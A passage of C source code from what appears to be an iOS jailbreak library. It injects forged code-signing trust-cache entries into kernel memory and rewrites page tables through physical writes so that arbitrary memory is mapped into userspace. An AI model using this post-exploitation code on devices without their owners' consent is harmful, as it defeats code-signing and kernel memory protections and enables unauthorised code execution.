		kwrite64(kread64(ksymbol(ppl_trust_cache_rt) + 0x20), newStart);
	}
}

void _trustcache_list_enumerate(void (^enumerateBlock)(uint64_t tcKaddr, bool *stop))
{
	uint64_t curTC = _trustcache_list_get_start();
	while(curTC != 0) {
		bool stop = false;
		enumerateBlock(curTC, &stop);
		if (stop) break;
		curTC = kread64(curTC + koffsetof(trustcache, nextptr));
	}
}

int trustcache_list_insert(uint64_t tcToInsert)
{
	if (!tcToInsert) return -1;
	uint64_t previousStartTC = _trustcache_list_get_start();
	kwrite64(tcToInsert + koffsetof(trustcache, nextptr), previousStartTC);
	if (koffsetof(trustcache, prevptr)) {
		kwrite64(previousStartTC + koffsetof(trustcache, prevptr), tcToInsert);
	}
	_trustcache_list_set_start(tcToInsert);
	return 0;
}

int trustcache_list_remove(uint64_t tcKaddr)
{
	if (!tcKaddr) return -1;

	uint64_t nextTc = kread64(tcKaddr + koffsetof(trustcache, nextptr));

	uint64_t curTc = _trustcache_list_get_start();
	if (curTc == 0) {
		return -1;
	}
	else if (curTc == tcKaddr) {
		_trustcache_list_set_start(nextTc);
		if (nextTc && koffsetof(trustcache, prevptr)) {
			kwrite64(nextTc + koffsetof(trustcache, prevptr), 0);
		}
	}
	else {
		uint64_t prevTc = 0;
		while (curTc != tcKaddr)
		{
			if (curTc == 0) {
				return -1;
			}
			prevTc = curTc;
			curTc = kread64(curTc);
		}
		kwrite64(prevTc + koffsetof(trustcache, nextptr), nextTc);
		if (nextTc && koffsetof(trustcache, prevptr)) {
			kwrite64(nextTc + koffsetof(trustcache, prevptr), prevTc);
		}
	}

	return 0;
}

int _trustcache_file_sort_entry_comparator_v1(const void * vp1, const void * vp2)
{
	trustcache_entry_v1* tc1 = (trustcache_entry_v1*)vp1;
	trustcache_entry_v1* tc2 = (trustcache_entry_v1*)vp2;
	return memcmp(tc1->hash, tc2->hash, sizeof(cdhash_t));
}

void _trustcache_file_sort(trustcache_file_v1 *file)
{
	qsort(file->entries, file->length, sizeof(trustcache_entry_v1), _trustcache_file_sort_entry_comparator_v1);
}

bool _is_jb_trustcache(uint64_t tcKaddr)
{
	uint64_t jbTcFile = tcKaddr + offsetof(jb_trustcache, file);
	uint64_t file = kread64(tcKaddr + koffsetof(trustcache, fileptr));
	if (file == jbTcFile) {
		// If there is exactly one 8-byte value between the kpage start and the trustcache file,
		// Check if that matches against the JB_MAGIC
		// This is a 100% accurate way of determining whether this entry is a jb_trustcache or not
		return (kread64(tcKaddr + offsetof(jb_trustcache, magic)) == JB_MAGIC);
	}
	return false;
}

void _jb_trustcache_enumerate(void (^enumerateBlock)(uint64_t jbTcKaddr, bool *stop))
{
	_trustcache_list_enumerate(^(uint64_t tcKaddr, bool *stop) {
		if (_is_jb_trustcache(tcKaddr)) {
			enumerateBlock(tcKaddr, stop);
		}
	});
}

void jb_trustcache_clear(void)
{
	_jb_trustcache_enumerate(^(uint64_t jbTcKaddr, bool *stop) {
		kwrite64(jbTcKaddr + offsetof(jb_trustcache, file.length), 0);
	});
}

uint64_t _jb_trustcache_grow(void)
{
	uint64_t jbTcKern = 0;
	if (kalloc(&jbTcKern, 0x4000) != 0) return 0;

	jb_trustcache *jbTc = alloca(sizeof(jb_trustcache));
	memset(jbTc, 0, sizeof(jb_trustcache));
	_trustcache_file_init(&jbTc->file);
	jbTc->magic = JB_MAGIC;
	*(uint64_t *)(jbTc->trustcache + koffsetof(trustcache, fileptr)) = (jbTcKern + offsetof(jb_trustcache, file));
	if (koffsetof(trustcache, size)) {
		*(uint64_t *)(jbTc->trustcache + koffsetof(trustcache, size)) = JB_TRUSTCACHE_SIZE;
	}
	kwritebuf(jbTcKern, jbTc, sizeof(*jbTc));
	trustcache_list_insert(jbTcKern);
	return jbTcKern;
}

int jb_trustcache_add_entries(struct trustcache_entry_v1 *entries, uint32_t entryCount)
{
	uint32_t remainingEntryCount = entryCount;
	while (remainingEntryCount > 0) {
		__block uint64_t freeJbTcKaddr = 0;
		__block uint32_t freeJbTcCurrentLength = 0;
		_jb_trustcache_enumerate(^(uint64_t jbTcKaddr, bool *stop) {
			uint32_t length = kread32(jbTcKaddr + offsetof(jb_trustcache, file.length));
			if (length < JB_TRUSTCACHE_ENTRY_COUNT) {
				freeJbTcKaddr = jbTcKaddr;
				freeJbTcCurrentLength = length;
				*stop = true;
			}
		});
		if (freeJbTcKaddr == 0) {
			freeJbTcKaddr = _jb_trustcache_grow();
		}

		uint32_t entryCountToInsert = JB_TRUSTCACHE_ENTRY_COUNT - freeJbTcCurrentLength;
		if (remainingEntryCount < entryCountToInsert) {
			entryCountToInsert = remainingEntryCount;
		}

		jb_trustcache *jbTc = alloca(JB_TRUSTCACHE_SIZE);
		kreadbuf(freeJbTcKaddr, jbTc, JB_TRUSTCACHE_SIZE);
		for (uint32_t i = 0; i < entryCountToInsert; i++) {
			jbTc->file.entries[freeJbTcCurrentLength+i] = entries[i];
		}
		jbTc->file.length += entryCountToInsert;
		_trustcache_file_sort(&jbTc->file);
		kwritebuf(freeJbTcKaddr, jbTc, JB_TRUSTCACHE_SIZE);
		remainingEntryCount -= entryCountToInsert;
	}
	return 0;
}

int jb_trustcache_add_cdhashes(cdhash_t *hashes, uint32_t hashCount)
{
	struct trustcache_entry_v1 entries[hashCount];
	for (int i = 0; i < hashCount; i++) {
		memcpy(entries[i].hash, hashes[i], sizeof(cdhash_t));
		entries[i].hash_type = 1;
		entries[i].flags = 0;
	}
	return jb_trustcache_add_entries(entries, hashCount);
}

int jb_trustcache_add_entry(struct trustcache_entry_v1 entry)
{
	return jb_trustcache_add_entries(&entry, 1);
}


/*int jb_trustcache_add_file(const char *filePath)
{
	
}

int jb_trustcache_add_directory(const char *directoryPath)
{

}*/

xpc_object_t jb_trustcache_info(void)
{
	xpc_object_t arr = xpc_array_create_empty();
	_jb_trustcache_enumerate(^(uint64_t jbTcKaddr, bool *stop) {
		uuid_t uuid;
		kreadbuf(jbTcKaddr + offsetof(jb_trustcache, file.uuid), (void *)uuid, sizeof(uuid));
		uint32_t length = kread32(jbTcKaddr + offsetof(jb_trustcache, file.length));

		xpc_object_t tcDict = xpc_dictionary_create_empty();
		xpc_dictionary_set_data(tcDict, "uuid", &uuid, sizeof(uuid));

		xpc_object_t hashesArr = xpc_array_create_empty();
		for (int i = 0; i < length; i++) {
			trustcache_entry_v1 entry;
			kreadbuf(jbTcKaddr + offsetof(jb_trustcache, file.entries[i]), &entry, sizeof(entry));
			xpc_array_set_data(hashesArr, XPC_ARRAY_APPEND, &entry.hash, sizeof(entry.hash));
		}
		xpc_dictionary_set_value(tcDict, "cdhashes", hashesArr);
		xpc_release(hashesArr);

		xpc_array_append_value(arr, tcDict);
		xpc_release(tcDict);
	});
	return arr;
}

void jb_trustcache_debug_print(FILE *f)
{
	__block int i = 0;
	_jb_trustcache_enumerate(^(uint64_t jbTcKaddr, bool *stop) {
		uuid_t uuid;
		kreadbuf(jbTcKaddr + offsetof(jb_trustcache, file.uuid), (void *)uuid, sizeof(uuid));
		uint32_t length = kread32(jbTcKaddr + offsetof(jb_trustcache, file.length));

		uint32_t *uuidData = (uint32_t *)uuid;
		fprintf(f, "Jailbreak TrustCache %d <%08x%08x%08x%08x> (length: %u) (kaddr: 0x%llx):\n", i++, htonl(uuidData[0]), htonl(uuidData[1]), htonl(uuidData[2]), htonl(uuidData[3]), length, jbTcKaddr);
		
		for (uint32_t j = 0; j < length; j++) {
			trustcache_entry_v1 entry;
			kreadbuf(jbTcKaddr + offsetof(jb_trustcache, file.entries[j]), &entry, sizeof(entry));
			fprintf(f, "| ");
			for (uint32_t k = 0; k < sizeof(cdhash_t); k++) {
				fprintf(f, "%02x", entry.hash[k]);
			}
			fprintf(f, "\n");
		}
	});
}

int trustcache_file_upload(trustcache_file_v1 *tc)
{
	uint64_t tcSize = ksizeof(trustcache) + sizeof(trustcache_file_v1) + (tc->length * sizeof(trustcache_entry_v1));
	if (tcSize > 0x4000) return -1;

	// Check if there is already a TrustCache with the same UUID
	__block uint64_t existingTcKaddr = 0;
	_trustcache_list_enumerate(^(uint64_t tcKaddr, bool *stop) {
		uint64_t tcFileKaddr = kread64(tcKaddr + koffsetof(trustcache, fileptr));
		uuid_t tcFileUUID;
		kreadbuf(tcFileKaddr + offsetof(trustcache_file_v1, uuid), tcFileUUID, sizeof(tcFileUUID));
		if (memcmp(tcFileUUID, tc->uuid, sizeof(tcFileUUID)) == 0) {
			existingTcKaddr = tcKaddr;
			*stop = true;
		}
	});

	// If so, we want to either replace it or remove it
	if (existingTcKaddr != 0) {
		if (_is_jb_trustcache(existingTcKaddr)) {
			// There is something terribly wrong, abort
			return -1;
		}

		uint64_t prevTcFile = kread64(existingTcKaddr + koffsetof(trustcache, fileptr));
		uint32_t prevTcLength = kread32(prevTcFile + offsetof(trustcache_file_v1, length));
		uint64_t prevTcSize = ksizeof(trustcache) + sizeof(trustcache_file_v1) + (prevTcLength * sizeof(trustcache_entry_v1));
		if (prevTcSize == tcSize) {
			// If size is the same this is simple, just replace the file data
			kwritebuf(prevTcFile, tc, tcSize);
			return 0;
		}
		else {
			// If not, it gets more complicated and hacky...
			// We can't take a lock (at least not yet??) to ensure nothing accesses the original TrustCache after we freed it
			// So we do the next best thing, we remove it from the linked list and wait a bit before freeing it, hoping that any
			// outstanding reads on the memory would be done by then
			if (trustcache_list_remove(existingTcKaddr) != 0) {
				return -1; // really unlikely error, if this triggers the world is probably upside down
			}
			usleep(10000); // hope for current accesses to finish if there are any (new accesses won't come as we removed the list entry)
			kfree(existingTcKaddr, prevTcSize); // free the original allocation
			// now just fall through and make this function add the new TrustCache
		}
	}

	uint64_t tcKaddr = 0;
	if (kalloc(&tcKaddr, tcSize) != 0) return -1;

	uint64_t tcFileKaddr = tcKaddr + ksizeof(trustcache);
	kwritebuf(tcFileKaddr, tc, tcSize - ksizeof(trustcache));

	kwrite64(tcKaddr + koffsetof(trustcache, fileptr), tcFileKaddr);
	if (koffsetof(trustcache, size)) {
		kwrite64(tcKaddr + koffsetof(trustcache, size), tcSize);
	}

	trustcache_list_insert(tcKaddr);
	return 0;
}

int trustcache_file_upload_with_uuid(trustcache_file_v1 *tc, uuid_t uuid)
{
	memcpy(tc->uuid, uuid, sizeof(uuid_t));
	return trustcache_file_upload(tc);
}

int trustcache_file_build_from_cdhashes(cdhash_t *CDHashes, uint32_t CDHashCount, trustcache_file_v1 **tcOut)
{
	if (!CDHashes || CDHashCount == 0 || !tcOut) return -1;

	size_t tcSize = sizeof(trustcache_file_v1) + (sizeof(trustcache_entry_v1) * CDHashCount);
	trustcache_file_v1 *file = malloc(tcSize);
	_trustcache_file_init(file);

	file->length = CDHashCount;
	for (uint32_t i = 0; i < CDHashCount; i++) {
		memcpy(file->entries[i].hash, CDHashes[i], sizeof(cdhash_t));
		file->entries[i].hash_type = 2;
		file->entries[i].flags = 0;
	}
	_trustcache_file_sort(file);

	*tcOut = file;
	return 0;
}

int trustcache_file_build_from_path(const char *filePath, trustcache_file_v1 **tcOut)
{
	int fd = open(filePath, O_RDONLY);
	struct stat s = { 0 };
	fstat(fd, &s);
	
	size_t tcSize = s.st_size;
	if (tcSize < (sizeof(trustcache_file_v1))) {
		// To small to be a TrustCache, file is probably malformed
		return -1;
	}

	trustcache_file_v1 *file = malloc(tcSize);
	read(fd, file, tcSize);
	close(fd);

	size_t actualTcSize = sizeof(trustcache_file_v1) + (sizeof(trustcache_entry_v1) * file->length);
	if (actualTcSize != tcSize) {
		// Size mismatch, file is malformed
		free(file);
		return -1;
	}

	*tcOut = file;
	return 0;
}

bool trustcache_contains_cdhash(uint64_t tcKaddr, cdhash_t CDHash)
{
	uint64_t tcFileKaddr = kread64(tcKaddr + koffsetof(trustcache, fileptr));
	uint32_t length = kread32(tcFileKaddr + offsetof(trustcache_file_v1, length));
	if (length == 0) return false;

	int32_t left = 0;
	int32_t right = length - 1;

	while (left <= right) {
		int32_t mid = (left + right) / 2;
		cdhash_t itCDHash;
		kreadbuf(tcFileKaddr + offsetof(trustcache_file_v1, entries[mid].hash), itCDHash, CS_CDHASH_LEN);
		int32_t cmp = memcmp(CDHash, itCDHash, CS_CDHASH_LEN);
		if (cmp == 0) {
			return true;
		}
		if (cmp < 0) {
			right = mid - 1;
		} else {
			left = mid + 1;
		}
	}
	return false;
}

bool is_cdhash_trustcached(cdhash_t CDHash)
{
	__block bool inTrustCache = false;
	_trustcache_list_enumerate(^(uint64_t tcKaddr, bool *stop) {
		bool inThisTrustCache = trustcache_contains_cdhash(tcKaddr, CDHash);
		if (inThisTrustCache) {
			inTrustCache = true;
			*stop = true;
		}
	});
	return inTrustCache;
}
```

`BaseBin/libjailbreak/src/trustcache.h`:

```h
#ifndef TRUSTCACHE_H
#define TRUSTCACHE_H

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "trustcache_structs.h"
#include <xpc/xpc.h>

#define BASEBIN_TRUSTCACHE_UUID (uuid_t){'B','A','S','E','B','I','N','\0','\0','\0','\0','\0','\0','\0','\0','\0'}
#define DYLD_TRUSTCACHE_UUID (uuid_t){'D','Y','L','D','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0'}

int trustcache_list_insert(uint64_t tcKaddr);

int jb_trustcache_add_entries(struct trustcache_entry_v1 *entries, uint32_t entryCount);
int jb_trustcache_add_entry(trustcache_entry_v1 entry);
int jb_trustcache_add_cdhashes(cdhash_t *hashes, uint32_t hashCount);
xpc_object_t jb_trustcache_info(void);
void jb_trustcache_clear(void);

//int jb_trustcache_add_file(const char *filePath);
//int jb_trustcache_add_directory(const char *directoryPath);
//void jb_trustcache_rebuild(void);

void jb_trustcache_debug_print(FILE *f);

int trustcache_file_upload(trustcache_file_v1 *tc);
int trustcache_file_upload_with_uuid(trustcache_file_v1 *tc, uuid_t uuid);
int trustcache_file_build_from_cdhashes(cdhash_t *CDHashes, uint32_t CDHashCount, trustcache_file_v1 **tcOut);
int trustcache_file_build_from_path(const char *filePath, trustcache_file_v1 **tcOut);

bool is_cdhash_in_trustcache(uint64_t tcKaddr, cdhash_t CDHash);
bool is_cdhash_trustcached(cdhash_t CDHash);

#endif

```

`BaseBin/libjailbreak/src/trustcache_structs.h`:

```h
#ifndef TRUSTCACHE_STRUCTS_H
#define TRUSTCACHE_STRUCTS_H

#include <uuid/uuid.h>
#include <choma/CSBlob.h>
#include <stdint.h>

// TODO: Move to ChOma?
#define CS_CDHASH_LEN 20

typedef uint8_t cdhash_t[CS_CDHASH_LEN];

typedef struct trustcache_entry_v1
{
	cdhash_t hash;
	uint8_t hash_type;
	uint8_t flags;
} __attribute__((__packed__)) trustcache_entry_v1;

typedef struct s_trustcache_file_v1
{
	uint32_t version;
	uuid_t uuid;
	uint32_t length;
	trustcache_entry_v1 entries[];
} __attribute__((__packed__)) trustcache_file_v1;

#define JB_MAGIC 0x424a424a424a424a // "JBJBJBJB"
typedef struct jb_trustcache
{
	// On iOS 15, the trustcache struct has a size of 0x10
	// On iOS 16, it has one of 0x28, we just have to make sure our field is bigger
	uint8_t trustcache[0x40];
	uint64_t magic;
	trustcache_file_v1 file;
} __attribute__((__packed__)) jb_trustcache;

#define JB_TRUSTCACHE_SIZE 0x4000
#define JB_TRUSTCACHE_ENTRY_COUNT ((JB_TRUSTCACHE_SIZE - sizeof(jb_trustcache)) / sizeof(trustcache_entry_v1))

#endif
```

`BaseBin/libjailbreak/src/util.c`:

```c
#include "util.h"
#include "primitives.h"
#include "info.h"
#include "kernel.h"
#include "translation.h"
#include <spawn.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <signal.h>
#include <dlfcn.h>
#include <sys/sysctl.h>
#include <archive.h>
#include <archive_entry.h>
#include <math.h>
#include <mach-o/dyld.h>
#include <dirent.h>
#include <IOKit/IOKitLib.h>
#include <mach-o/dyld_images.h>
#include <mach-o/getsect.h>
#include <dyld_cache_format.h>
extern char **environ;

#define FAKE_PHYSPAGE_TO_MAP 0x13370000

#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
extern int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
extern int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);
int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);

const struct mach_header *get_mach_header(const char *name)
{
	const struct mach_header *mh = NULL;
	for (int i = 0; i < _dyld_image_count(); i++) {
		if (!strcmp(_dyld_get_image_name(i), name)) {
			mh = _dyld_get_image_header(i);
			break;
		}
	}
	return mh;
}

void proc_iterate(void (^itBlock)(uint64_t, bool*))
{
	uint64_t proc = ksymbol(allproc);
	while((proc = kread_ptr(proc + koffsetof(proc, list_next))))
	{
		bool stop = false;
		itBlock(proc, &stop);
		if(stop) return;
	}
}

uint64_t proc_self(void)
{
	static uint64_t gSelfProc = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfProc = proc_find(getpid());
		// decrement ref count again, we assume proc_self will exist for the whole lifetime of this process
		proc_rele(gSelfProc);
	});
	return gSelfProc;
}

uint64_t task_self(void)
{
	static uint64_t gSelfTask = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfTask = proc_task(proc_self());
	});
	return gSelfTask;
}

uint64_t vm_map_self(void)
{
	static uint64_t gSelfMap = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfMap = kread_ptr(task_self() + koffsetof(task, map));
	});
	return gSelfMap;
}

uint64_t pmap_self(void)
{
	static uint64_t gSelfPmap = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfPmap = kread_ptr(vm_map_self() + koffsetof(vm_map, pmap));
	});
	return gSelfPmap;
}

uint64_t ttep_self(void)
{
	static uint64_t gSelfTTEP = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfTTEP = kread_ptr(pmap_self() + koffsetof(pmap, ttep));
	});
	return gSelfTTEP;
}

uint64_t tte_self(void)
{
	static uint64_t gSelfTTE = 0;
	static dispatch_once_t onceToken;
	dispatch_once(&onceToken, ^{
		gSelfTTE = kread_ptr(pmap_self() + koffsetof(pmap, tte));
	});
	return gSelfTTE;
}

uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port)
{
	uint64_t itk_space = kread_ptr(task + koffsetof(task, itk_space));
	return ipc_entry_lookup(itk_space, port);
}

uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port)
{
	return kread_ptr(task_get_ipc_port_table_entry(task, port) + koffsetof(ipc_entry, object));
}

uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port)
{
	return kread_ptr(task_get_ipc_port_object(task, port) + koffsetof(ipc_port, kobject));
}

uint64_t alloc_page_table_unassigned(void)
{
	uint64_t pmap = pmap_self();
	uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));

	void *free_lvl2 = NULL;
	uint64_t tte_lvl2 = 0;
	uint64_t allocatedPT = 0;
	uint64_t pinfo_pa = 0;
	while (true) {
		// When we allocate the entire address range of an L2 block, we can assume ownership of the backing table
		if (posix_memalign(&free_lvl2, L2_BLOCK_SIZE, L2_BLOCK_SIZE) != 0) {
			printf("WARNING: Failed to allocate L2 page table address range\n");
			return 0;
		}
		// Now, fault in one page to make the kernel allocate the page table for it
		*(volatile uint64_t *)free_lvl2;

		// Find the newly allocated page table
		uint64_t lvl = PMAP_TT_L2_LEVEL;
		allocatedPT = vtophys_lvl(ttep, (uint64_t)free_lvl2, &lvl, &tte_lvl2);

		uint64_t pvh = pai_to_pvh(pa_index(allocatedPT));
		uint64_t ptdp = pvh_ptd(pvh);
		uint64_t pinfo = kread64(ptdp + koffsetof(pt_desc, ptd_info));
		pinfo_pa = kvtophys(pinfo);

		uint16_t refCount = physread16(pinfo_pa);
		if (refCount != 1) {
			// Something is off, retry
			free(free_lvl2);
			continue;
		}
		break;
	}

	// Handle case where all entries in the level 2 table are 0 after we leak ours
	// In that case, leak an allocation in the span of it to keep it alive
	/*uint64_t lvl2Table = tte_lvl2 & ~PAGE_MASK;
	uint64_t lvl2TableEntries[PAGE_SIZE / sizeof(uint64_t)];
	physreadbuf(lvl2Table, lvl2TableEntries, PAGE_SIZE);
	int freeIdx = -1;
	for (int i = 0; i < (PAGE_SIZE / sizeof(uint64_t)); i++) {
		uint64_t curPtr = lvl2Table + (sizeof(uint64_t) * i);
		if (curPtr != tte_lvl2) {
			if (lvl2TableEntries[i]) {
				freeIdx = -1;
				break;
			}
			else {
				freeIdx = i;
			}
		}
	}
	if (freeIdx != -1) {
		vm_address_t freeUserspace = ((uint64_t)free_lvl2 & ~L1_BLOCK_MASK) + (freeIdx * L2_BLOCK_SIZE);
		if (vm_allocate(mach_task_self(), &freeUserspace, 0x4000, VM_FLAGS_FIXED) == 0) {
			*(volatile uint8_t *)freeUserspace;
		}
	}*/

	// Bump reference count of our allocated page table
	physwrite16(pinfo_pa, 0x1337);

	// Deallocate address range (our allocated page table will stay because we bumped it's reference count)
	free(free_lvl2);

	// Remove our allocated page table from it's original location (leak it)
	physwrite64(tte_lvl2, 0);

	// Ensure there is at least one entry in page table
	// Attempts to prevent "pte is empty" panic
	// Sometimes weird prefetches happen so this has to be a valid physical page to ensure those don't panic
	// Disabled for now cause it causes super weird issues
	//physwrite64(allocatedPT, kconstant(physBase) | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY);

	// Reference count of new page table must be 0!
	// original ref count is 1 because the table holds one PTE
	// Our new PTEs are not part of the pmap layer though so refcount needs to be 0
	physwrite16(pinfo_pa, 0);

	// After we leaked the page table, the ledger still thinks it belongs to our process
	// We need to remove it from there aswell so that the process doesn't get jetsam killed
	// (This ended up more complicated than I thought, so I just disabled jetsam in launchd)
	//uint64_t ledger = kread_ptr(pmap + koffsetof(pmap, ledger));
	//uint64_t ledger_pa = kvtophys(ledger);
	//int page_table_ledger = physread32(ledger_pa + koffsetof(_task_ledger_indices, page_table));
	//physwrite32(ledger_pa + koffsetof(_task_ledger_indices, page_table), page_table_ledger - 1);

	return allocatedPT;
}

uint64_t pmap_alloc_page_table(uint64_t pmap, uint64_t va)
{
	if (!pmap) {
		pmap = pmap_self();
	}

	uint64_t tt_p = alloc_page_table_unassigned();
	if (!tt_p) return 0;

	uint64_t pvh = pai_to_pvh(pa_index(tt_p));
	uint64_t ptdp = pvh_ptd(pvh);

	uint64_t ptdp_pa = kvtophys(ptdp);

	// At this point the allocated page table is associated
	// to the pmap of this process alongside the address it was allocated on
	// We now need to replace the association with the context in which it will be used
	physwrite64(ptdp_pa + koffsetof(pt_desc, pmap), pmap);

	// On A14+ PT_INDEX_MAX is 4, for whatever reason
	// However in practice, only the first slot is used...
	for (uint64_t po = 0; po < vm_page_size; po += vm_real_kernel_page_size) {
		physwrite64(ptdp_pa + koffsetof(pt_desc, va) + (po / vm_page_size), va + po);
	}

	return tt_p;
}

int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size)
{
	uint64_t ttep = kread_ptr(pmap + koffsetof(pmap, ttep));

	if (is_kcall_available()) {
		uint64_t unmappedStart = 0, unmappedSize = 0;

		uint64_t l2Start = vaStart & ~L2_BLOCK_MASK;
		uint64_t l2End = (vaStart + (size - 1)) & ~L2_BLOCK_MASK;
		uint64_t l2Count = ((l2End - l2Start) / L2_BLOCK_SIZE) + 1;

		for (uint64_t i = 0; i <= l2Count; i++) {
			uint64_t curL2 = l2Start + (i * L2_BLOCK_SIZE);

			uint64_t leafLevel = PMAP_TT_L3_LEVEL;
			uint64_t pt3 = 0;
			vtophys_lvl(ttep, curL2, &leafLevel, &pt3);
			if (leafLevel == PMAP_TT_L3_LEVEL || i == l2Count) {
				// i == l2Count: one extra cycle that this for loop takes
				// We hit this block either if there was a mapping or at the end
				// Alloc page tables for the current area (unmappedStart, unmappedSize) by running pmap_enter_options on every page
				// And then running pmap_remove on the entire area while nested is true

				for (uint64_t l2Off = 0; l2Off < unmappedSize; l2Off += L2_BLOCK_SIZE) {
					kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, unmappedStart + l2Off);
					if (kr != KERN_SUCCESS) {
						return -7;
					}
				}

				// Set type to nested
				physwrite8(kvtophys(pmap + koffsetof(pmap, type)), 3);

				// Remove mapping (table will stay cause nested is set)
				pmap_remove(pmap, unmappedStart, unmappedStart + unmappedSize);

				// Change type back
				physwrite8(kvtophys(pmap + koffsetof(pmap, type)), 0);
				
				unmappedStart = 0;
				unmappedSize = 0;
				continue;
			}
			else {
				if (unmappedStart == 0) {
					unmappedStart = curL2;
				}
				unmappedSize += L2_BLOCK_SIZE;
			}
		}
	}
	else {
		uint64_t l2Start = (vaStart & ~L2_BLOCK_MASK);
		uint64_t l2End   = (((vaStart + size) + (L2_BLOCK_SIZE-1)) & ~L2_BLOCK_MASK);
		for (uint64_t va = l2Start; va < l2End; va += L2_BLOCK_SIZE) {
			uint64_t leafLevel;
			do {
				leafLevel = PMAP_TT_L3_LEVEL;
				uint64_t pte = 0;
				vtophys_lvl(ttep, va, &leafLevel, &pte);
				if (leafLevel != PMAP_TT_L3_LEVEL) {
					uint64_t pt_va = 0;
					switch (leafLevel) {
						case PMAP_TT_L1_LEVEL: {
							pt_va = va & ~L1_BLOCK_MASK;
							break;
						}
						case PMAP_TT_L2_LEVEL: {
							pt_va = va & ~L2_BLOCK_MASK;
							break;
						}
					}
					leafLevel++;
					uint64_t newTable = pmap_alloc_page_table(pmap, pt_va);
					if (newTable) {
						physwrite64(pte, newTable | ARM_TTE_VALID | ARM_TTE_TYPE_TABLE);
					}
					else {
						return -2;
					}
				}
			} while (leafLevel < PMAP_TT_L3_LEVEL);
		}
	}
	return 0;
}

int pmap_map_in(uint64_t pmap, uint64_t uaStart, uint64_t paStart, uint64_t size)
{
	uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));

	uint64_t paEnd = paStart + size;
	uint64_t uaEnd = uaStart + size;

	uint64_t uaL2Start = uaStart & ~L2_BLOCK_MASK;
	uint64_t uaL2End   = ((uaStart + size - 1) + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK;

	uint64_t paL2Start = paStart & ~L2_BLOCK_MASK;
	uint64_t l2Count = (((uaL2End - uaL2Start) - 1) / L2_BLOCK_SIZE) + 1;

	// Sanity check: Ensure the entire area to be mapped in is not mapped to anything yet
	for(uint64_t ua = uaStart; ua < uaEnd; ua += vm_real_kernel_page_size) {
		uint64_t leafLevel = PMAP_TT_L3_LEVEL;
		if (vtophys_lvl(ttep, ua, &leafLevel, NULL) != 0) {
			return -1;
		}
		else {
			// Performance improvement
			// If there is no L1 / L2 mapping we can skip a whole bunch of addresses
			if (leafLevel == PMAP_TT_L1_LEVEL) {
				ua = (((ua + L1_BLOCK_SIZE) & ~L1_BLOCK_MASK) - vm_real_kernel_page_size);
			}
			else if (leafLevel == PMAP_TT_L2_LEVEL) {
				ua = (((ua + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK) - vm_real_kernel_page_size);
			}
		}

		if (vtophys(ttep, ua)) return -1;
		// TODO: If all mappings match 1:1, maybe return 0 instead of -1?
	}

	// Allocate all page tables that need to be allocated
	if (pmap_expand_range(pmap, uaStart, size) != 0) return -1;

	// Insert entries into L3 pages
	uint64_t curPA = paStart;
	for (uint64_t i = 0; i < l2Count; i++) {
		uint64_t uaL2Cur = uaL2Start + (i * L2_BLOCK_SIZE);

		// Current L2 range
		uint64_t uaL2CurStart = uaL2Cur;
		uint64_t uaL2CurEnd = uaL2Cur + L2_BLOCK_SIZE;

		// Round to passed boundary if neccessary
		if (uaStart > uaL2CurStart) uaL2CurStart = uaStart;
		if (uaEnd < uaL2CurEnd) uaL2CurEnd = uaEnd;

		// Create full table for this mapping
		uint64_t tableToWrite[L2_BLOCK_COUNT];
		memset(tableToWrite, 0, sizeof(tableToWrite));
		for (uint64_t curUA = uaL2CurStart; curUA < uaL2CurEnd; curUA += vm_real_kernel_page_size, curPA += vm_real_kernel_page_size) {
			int idx = (curUA - uaL2Cur) / vm_real_kernel_page_size;
			tableToWrite[idx] = curPA | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
		}

		// Replace table with the entries we generated
		uint64_t leafLevel = PMAP_TT_L2_LEVEL;
		uint64_t level2Table = vtophys_lvl(ttep, uaL2Cur, &leafLevel, NULL);
		if (!level2Table) return -2;
		physwritebuf(level2Table, tableToWrite, vm_real_kernel_page_size);
	}

	return 0;
}

#ifdef __arm64e__

uint64_t pmap_find_main_binary_code_dir(uint64_t pmap)
{
	uint64_t mainCodeDir = 0;
	uint64_t pmap_cs_region = kread_ptr(pmap + koffsetof(pmap, pmap_cs_main));
	while (pmap_cs_region && !mainCodeDir) {
		uint64_t pmap_cs_code_dir = kread_ptr(pmap_cs_region + koffsetof(pmap_cs_region, cd_entry));
		while (pmap_cs_code_dir) {
			_Bool mainBinary = kread64(pmap_cs_code_dir + koffsetof(pmap_cs_code_directory, main_binary));
			if (mainBinary) {
				mainCodeDir = pmap_cs_code_dir;
				break;
			}
			pmap_cs_code_dir = kread_ptr(pmap_cs_code_dir + koffsetof(pmap_cs_code_directory, pmap_cs_code_directory_next));
		}
		pmap_cs_region = kread_ptr(pmap_cs_region + koffsetof(pmap_cs_region, pmap_cs_region_next));
	}
	return mainCodeDir;
}

uint64_t proc_find_main_binary_code_dir(uint64_t proc)
{
	uint64_t task = proc_task(proc);
